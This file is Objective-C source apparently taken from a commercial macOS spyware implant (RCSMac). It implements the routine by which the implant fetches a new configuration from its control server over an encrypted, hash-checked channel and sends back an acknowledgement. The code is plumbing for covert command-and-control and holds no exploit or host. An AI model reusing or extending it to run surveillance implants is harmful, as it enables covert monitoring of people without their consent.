/*
 * RCSMac - ConfigurationUpdate Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "ConfNetworkOperation.h"
#import "RCSMCommon.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "RCSMInfoManager.h"

#import "RCSMTaskManager.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"


@implementation ConfNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;

      return self;
    }
  
  return nil;
}

// Done.
- (BOOL)perform
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];

  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];

  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
  
  if (replyData == nil)
    {
      [infoManager release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];

  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
  
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    { 
      // FIXED-
      [replyDecrypted release];
      [infoManager release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];

  if ([shaRemote isEqualToData: shaLocal] == NO)
    { 
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  if (command != PROTO_OK)
    {   
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
    
  uint32_t configSize = 0;
  @try
    {
      [replyDecrypted getBytes: &configSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];      
      return NO;
    }

  if (configSize == 0)
    {   
      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  NSMutableData *configData;
  
  @try
    {
      configData = [[NSMutableData alloc] initWithData:
                    [replyDecrypted subdataWithRange: NSMakeRange(8, configSize)]];
    }
  @catch (NSException *e)
    {      
      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  //
  // Store new configuration file
  //
  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
  
  // Done.
  if ([taskManager updateConfiguration: configData] == FALSE)
    {  
      // FIXED-
      [configData release];
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  //
  
  [infoManager release];
  [configData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}

- (BOOL)sendConfAck:(int)retAck
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  
  [commandData appendBytes: &retAck length:sizeof(int)];                                                          
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];

  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil)
    {
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  [commandData release];
  [outerPool release];
  
  return YES;
}

@end
